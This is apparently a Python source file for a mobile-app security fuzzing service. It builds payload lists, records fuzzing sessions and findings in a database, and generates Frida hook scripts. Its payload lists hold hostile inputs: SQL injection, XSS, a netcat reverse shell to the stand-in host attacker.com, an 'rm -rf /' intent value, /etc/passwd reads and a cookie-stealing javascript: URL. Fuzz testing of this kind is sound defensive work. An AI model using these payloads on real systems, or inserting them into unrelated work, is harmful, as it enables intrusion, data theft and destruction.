"""
Automated Fuzzing Service

Fuzzes mobile app inputs to discover vulnerabilities:
- Input field fuzzing (text fields, forms)
- Intent fuzzing (Android)
- URL scheme fuzzing (iOS/Android)
- Deep link fuzzing
- API endpoint fuzzing
- File format fuzzing
"""

import asyncio
import json
import logging
import random
import string
from datetime import datetime
from enum import Enum
from typing import Optional
from uuid import uuid4

from sqlalchemy.ext.asyncio import AsyncSession

logger = logging.getLogger(__name__)


class FuzzType(str, Enum):
    """Types of fuzzing."""
    INPUT_FIELD = "input_field"
    INTENT = "intent"
    URL_SCHEME = "url_scheme"
    DEEP_LINK = "deep_link"
    API = "api"
    FILE = "file"


class FuzzPayloadGenerator:
    """Generates fuzzing payloads."""

    # Common fuzzing payloads
    PAYLOADS = {
        "sql_injection": [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "1' AND '1'='1",
            "admin'--",
            "1 OR 1=1",
            "' OR 1=1--",
            "'; EXEC xp_cmdshell('dir')--",
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert('XSS')>",
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; nc -e /bin/sh attacker.com 4444",
            "| ping -c 10 attacker.com",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
        ],
        "format_string": [
            "%s%s%s%s%s",
            "%x%x%x%x",
            "%n%n%n%n",
            "%d%d%d%d",
            "AAAA%08x.%08x.%08x.%08x",
        ],
        "buffer_overflow": [
            "A" * 100,
            "A" * 500,
            "A" * 1000,
            "A" * 5000,
            "A" * 10000,
            "\x00" * 100,
        ],
        "integer_overflow": [
            str(2**31 - 1),  # Max int
            str(2**31),  # Overflow
            str(-2**31),  # Min int
            str(2**63),  # Long overflow
            "-1",
            "0",
            "99999999999999999999",
        ],
        "unicode": [
            "\u0000",
            "\uFFFF",
            "\u202E",  # RTL override
            "𐀀" * 100,  # 4-byte UTF-8
            "\uD800\uDC00",  # Surrogate pair
        ],
        "special_chars": [
            "!@#$%^&*()",
            "<>{}[]|\\",
            "'\";:,.",
            "\n\r\t",
            "\x00\x01\x02\x03",
        ],
        "null_byte": [
            "test\x00.txt",
            "admin\x00",
            "%00",
            "file.txt%00.jpg",
        ],
    }

    # Android Intent fuzzing
    INTENT_PAYLOADS = {
        "actions": [
            "android.intent.action.VIEW",
            "android.intent.action.SEND",
            "android.intent.action.EDIT",
            "android.intent.action.DELETE",
        ],
        "extra_types": [
            {"key": "data", "value": "../../../../etc/passwd"},
            {"key": "url", "value": "javascript:alert(1)"},
            {"key": "command", "value": "; rm -rf /"},
        ],
        "malformed": [
            {"action": None, "data": "content://malicious"},
            {"action": "", "category": "invalid.category"},
        ],
    }

    # URL Scheme fuzzing
    URL_SCHEME_PAYLOADS = {
        "javascript": [
            "javascript:alert(document.cookie)",
            "javascript:void(0)",
            "javascript:window.location='http://attacker.com'",
        ],
        "file": [
            "file:///etc/passwd",
            "file:///data/data/com.app/databases/secret.db",
        ],
        "content": [
            "content://com.app.provider/users",
            "content://media/external/images",
        ],
    }

    def generate_payloads(self, payload_type: str, count: int = 10) -> list[str]:
        """Generate fuzzing payloads of a specific type."""
        if payload_type in self.PAYLOADS:
            payloads = self.PAYLOADS[payload_type]
            if len(payloads) >= count:
                return random.sample(payloads, count)
            return payloads + self._generate_random_variations(payload_type, count - len(payloads))
        return self._generate_random_payloads(count)

    def generate_all_payloads(self) -> list[tuple[str, str]]:
        """Generate all payload types."""
        all_payloads = []
        for payload_type, payloads in self.PAYLOADS.items():
            for payload in payloads:
                all_payloads.append((payload_type, payload))
        return all_payloads

    def _generate_random_variations(self, payload_type: str, count: int) -> list[str]:
        """Generate random variations of a payload type."""
        variations = []
        base_payloads = self.PAYLOADS.get(payload_type, [])

        for _ in range(count):
            if base_payloads:
                base = random.choice(base_payloads)
                # Add random prefix/suffix
                prefix = ''.join(random.choices(string.ascii_letters, k=random.randint(0, 5)))
                suffix = ''.join(random.choices(string.ascii_letters, k=random.randint(0, 5)))
                variations.append(f"{prefix}{base}{suffix}")
            else:
                variations.append(self._generate_random_string())

        return variations

    def _generate_random_payloads(self, count: int) -> list[str]:
        """Generate random payloads."""
        payloads = []
        for _ in range(count):
            payloads.append(self._generate_random_string())
        return payloads

    def _generate_random_string(self, length: int = None) -> str:
        """Generate a random string."""
        if length is None:
            length = random.randint(10, 100)
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choices(chars, k=length))

    def generate_intent_payloads(self) -> list[dict]:
        """Generate Android Intent fuzzing payloads."""
        payloads = []

        for action in self.INTENT_PAYLOADS["actions"]:
            for extra in self.INTENT_PAYLOADS["extra_types"]:
                payloads.append({
                    "action": action,
                    "extras": extra,
                })

        payloads.extend(self.INTENT_PAYLOADS["malformed"])
        return payloads

    def generate_url_scheme_payloads(self, scheme: str) -> list[str]:
        """Generate URL scheme fuzzing payloads."""
        payloads = []

        # Add scheme-specific payloads
        for payload_type, urls in self.URL_SCHEME_PAYLOADS.items():
            payloads.extend(urls)

        # Add injection payloads to scheme
        for injection in self.PAYLOADS["sql_injection"]:
            payloads.append(f"{scheme}://{injection}")

        for xss in self.PAYLOADS["xss"]:
            payloads.append(f"{scheme}://callback?data={xss}")

        return payloads


class FuzzingService:
    """Service for automated fuzzing."""

    def __init__(self, db: AsyncSession):
        self.db = db
        self.payload_generator = FuzzPayloadGenerator()

    async def create_fuzz_session(
        self,
        app_id: str,
        fuzz_type: str,
        target: str,
        payload_types: list[str],
        max_iterations: int = 100,
    ) -> dict:
        """Create a new fuzzing session."""
        session_id = str(uuid4())

        query = """
            INSERT INTO fuzz_sessions (
                session_id, app_id, fuzz_type, target,
                payload_types, max_iterations, status, started_at
            ) VALUES (
                :session_id, :app_id, :fuzz_type, :target,
                :payload_types, :max_iterations, 'pending', :started_at
            )
            RETURNING *
        """

        result = await self.db.execute(query, {
            "session_id": session_id,
            "app_id": app_id,
            "fuzz_type": fuzz_type,
            "target": target,
            "payload_types": json.dumps(payload_types),
            "max_iterations": max_iterations,
            "started_at": datetime.utcnow(),
        })
        await self.db.commit()

        row = result.fetchone()
        return dict(row._mapping) if row else {"session_id": session_id}

    async def start_fuzz_session(self, session_id: str) -> bool:
        """Start a fuzzing session."""
        query = """
            UPDATE fuzz_sessions
            SET status = 'running', started_at = :started_at
            WHERE session_id = :session_id AND status = 'pending'
        """

        result = await self.db.execute(query, {
            "session_id": session_id,
            "started_at": datetime.utcnow(),
        })
        await self.db.commit()

        return result.rowcount > 0

    async def stop_fuzz_session(self, session_id: str) -> bool:
        """Stop a fuzzing session."""
        query = """
            UPDATE fuzz_sessions
            SET status = 'stopped', completed_at = :completed_at
            WHERE session_id = :session_id AND status = 'running'
        """

        result = await self.db.execute(query, {
            "session_id": session_id,
            "completed_at": datetime.utcnow(),
        })
        await self.db.commit()

        return result.rowcount > 0

    async def complete_fuzz_session(self, session_id: str) -> bool:
        """Mark fuzzing session as complete."""
        query = """
            UPDATE fuzz_sessions
            SET status = 'completed', completed_at = :completed_at
            WHERE session_id = :session_id
        """

        result = await self.db.execute(query, {
            "session_id": session_id,
            "completed_at": datetime.utcnow(),
        })
        await self.db.commit()

        return result.rowcount > 0

    async def get_session(self, session_id: str) -> Optional[dict]:
        """Get fuzzing session details."""
        query = """
            SELECT * FROM fuzz_sessions
            WHERE session_id = :session_id
        """
        result = await self.db.execute(query, {"session_id": session_id})
        row = result.fetchone()
        if row:
            data = dict(row._mapping)
            if data.get("payload_types"):
                data["payload_types"] = json.loads(data["payload_types"])
            return data
        return None

    async def list_sessions(
        self,
        app_id: Optional[str] = None,
        status: Optional[str] = None,
    ) -> list[dict]:
        """List fuzzing sessions."""
        query = """
            SELECT * FROM fuzz_sessions
            WHERE (:app_id IS NULL OR app_id = :app_id)
            AND (:status IS NULL OR status = :status)
            ORDER BY started_at DESC
        """

        result = await self.db.execute(query, {
            "app_id": app_id,
            "status": status,
        })

        sessions = []
        for row in result.fetchall():
            data = dict(row._mapping)
            if data.get("payload_types"):
                data["payload_types"] = json.loads(data["payload_types"])
            sessions.append(data)

        return sessions

    async def record_fuzz_result(
        self,
        session_id: str,
        payload_type: str,
        payload: str,
        response: Optional[str] = None,
        is_crash: bool = False,
        is_timeout: bool = False,
        is_interesting: bool = False,
        details: Optional[dict] = None,
    ) -> dict:
        """Record a fuzzing result."""
        result_id = str(uuid4())

        query = """
            INSERT INTO fuzz_results (
                result_id, session_id, payload_type, payload,
                response, is_crash, is_timeout, is_interesting,
                details, timestamp
            ) VALUES (
                :result_id, :session_id, :payload_type, :payload,
                :response, :is_crash, :is_timeout, :is_interesting,
                :details, :timestamp
            )
            RETURNING *
        """

        result = await self.db.execute(query, {
            "result_id": result_id,
            "session_id": session_id,
            "payload_type": payload_type,
            "payload": payload,
            "response": response,
            "is_crash": is_crash,
            "is_timeout": is_timeout,
            "is_interesting": is_interesting,
            "details": json.dumps(details) if details else None,
            "timestamp": datetime.utcnow(),
        })
        await self.db.commit()

        row = result.fetchone()
        return dict(row._mapping) if row else {"result_id": result_id}

    async def get_fuzz_results(
        self,
        session_id: str,
        crashes_only: bool = False,
        interesting_only: bool = False,
        limit: int = 100,
        offset: int = 0,
    ) -> list[dict]:
        """Get fuzzing results for a session."""
        query = """
            SELECT * FROM fuzz_results
            WHERE session_id = :session_id
            AND (:crashes_only = FALSE OR is_crash = TRUE)
            AND (:interesting_only = FALSE OR is_interesting = TRUE)
            ORDER BY timestamp DESC
            LIMIT :limit OFFSET :offset
        """

        result = await self.db.execute(query, {
            "session_id": session_id,
            "crashes_only": crashes_only,
            "interesting_only": interesting_only,
            "limit": limit,
            "offset": offset,
        })

        results = []
        for row in result.fetchall():
            data = dict(row._mapping)
            if data.get("details"):
                data["details"] = json.loads(data["details"])
            results.append(data)

        return results

    async def get_session_summary(self, session_id: str) -> dict:
        """Get summary of fuzzing session."""
        session = await self.get_session(session_id)
        if not session:
            return {}

        query = """
            SELECT
                COUNT(*) as total,
                SUM(CASE WHEN is_crash THEN 1 ELSE 0 END) as crashes,
                SUM(CASE WHEN is_timeout THEN 1 ELSE 0 END) as timeouts,
                SUM(CASE WHEN is_interesting THEN 1 ELSE 0 END) as interesting
            FROM fuzz_results
            WHERE session_id = :session_id
        """

        result = await self.db.execute(query, {"session_id": session_id})
        row = result.fetchone()

        return {
            "session_id": session_id,
            "status": session.get("status"),
            "fuzz_type": session.get("fuzz_type"),
            "target": session.get("target"),
            "total_attempts": row.total if row else 0,
            "crashes": row.crashes if row else 0,
            "timeouts": row.timeouts if row else 0,
            "interesting_findings": row.interesting if row else 0,
            "started_at": session.get("started_at"),
            "completed_at": session.get("completed_at"),
        }

    async def generate_payloads_for_session(self, session_id: str) -> list[dict]:
        """Generate payloads for a fuzzing session."""
        session = await self.get_session(session_id)
        if not session:
            raise ValueError("Session not found")

        payload_types = session.get("payload_types", [])
        max_iterations = session.get("max_iterations", 100)

        all_payloads = []
        payloads_per_type = max(1, max_iterations // len(payload_types)) if payload_types else max_iterations

        for payload_type in payload_types:
            payloads = self.payload_generator.generate_payloads(payload_type, payloads_per_type)
            for payload in payloads:
                all_payloads.append({
                    "type": payload_type,
                    "payload": payload,
                })

        return all_payloads[:max_iterations]

    async def create_findings_from_results(
        self,
        session_id: str,
        app_id: str,
        scan_id: Optional[str] = None,
    ) -> list[str]:
        """Create findings from fuzzing results."""
        results = await self.get_fuzz_results(session_id, interesting_only=True, limit=1000)

        finding_ids = []
        for fuzz_result in results:
            if not fuzz_result.get("is_crash") and not fuzz_result.get("is_interesting"):
                continue

            finding_id = str(uuid4())

            severity = "critical" if fuzz_result.get("is_crash") else "high"
            title = f"Fuzzing: {fuzz_result.get('payload_type', 'unknown').replace('_', ' ').title()}"
            if fuzz_result.get("is_crash"):
                title = f"Crash via {fuzz_result.get('payload_type', 'unknown')}"

            query = """
                INSERT INTO findings (
                    finding_id, app_id, scan_id, title, description,
                    severity, category, tool, status, created_at
                ) VALUES (
                    :finding_id, :app_id, :scan_id, :title, :description,
                    :severity, :category, :tool, 'open', :created_at
                )
                RETURNING finding_id
            """

            await self.db.execute(query, {
                "finding_id": finding_id,
                "app_id": app_id,
                "scan_id": scan_id,
                "title": title,
                "description": f"Payload: {fuzz_result.get('payload', '')[:200]}",
                "severity": severity,
                "category": "input_validation",
                "tool": "fuzzer",
                "created_at": datetime.utcnow(),
            })

            finding_ids.append(finding_id)

        await self.db.commit()
        return finding_ids

    def get_frida_fuzzer_script(self, fuzz_type: str, target: str) -> str:
        """Generate Frida script for fuzzing."""
        if fuzz_type == "input_field":
            return f"""
// Mobilicustos Input Field Fuzzer
// Target: {target}

Java.perform(function() {{
    var EditText = Java.use('android.widget.EditText');

    EditText.setText.overload('java.lang.CharSequence').implementation = function(text) {{
        console.log('[FUZZ] Intercepted setText: ' + text);

        // Inject fuzz payload
        var fuzzPayload = '%FUZZ_PAYLOAD%';
        console.log('[FUZZ] Injecting: ' + fuzzPayload);

        return this.setText(fuzzPayload);
    }};
}});
"""
        elif fuzz_type == "intent":
            return f"""
// Mobilicustos Intent Fuzzer
// Target: {target}

Java.perform(function() {{
    var Intent = Java.use('android.content.Intent');
    var Activity = Java.use('android.app.Activity');

    Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {{
        console.log('[FUZZ] Original intent: ' + intent.toString());

        // Modify intent with fuzz data
        intent.putExtra('fuzz_data', '%FUZZ_PAYLOAD%');

        return this.startActivity(intent);
    }};
}});
"""
        else:
            return "// No fuzzer script available for this type"
